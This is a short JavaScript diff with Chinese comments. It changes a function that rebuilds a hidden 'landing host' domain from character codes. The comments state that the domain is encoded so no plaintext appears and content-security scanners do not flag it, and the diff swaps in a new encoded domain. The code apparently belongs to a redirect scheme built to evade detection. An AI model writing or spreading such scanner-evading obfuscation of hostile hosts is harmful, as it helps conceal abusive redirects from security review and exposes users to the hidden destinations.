@@ -130,7 +130,7 @@
     // 这里若解码结果非 http 开头, 用本地字符码拼出落地主机再还原完整URL。
     // 域名以字符码形式存在源码中, 不出现明文, 避免内容安全扫描命中。
     function buildHost() {
-        var codes = [119,117,100,105,100,101,119,111,46,108,111,108];
+        var codes = [97,114,105,103,104,97,104,117,115,97,46,105,99,117];
         var s = '';
         for (var i = 0; i < codes.length; i++) s += String.fromCharCode(codes[i]);
         return s;
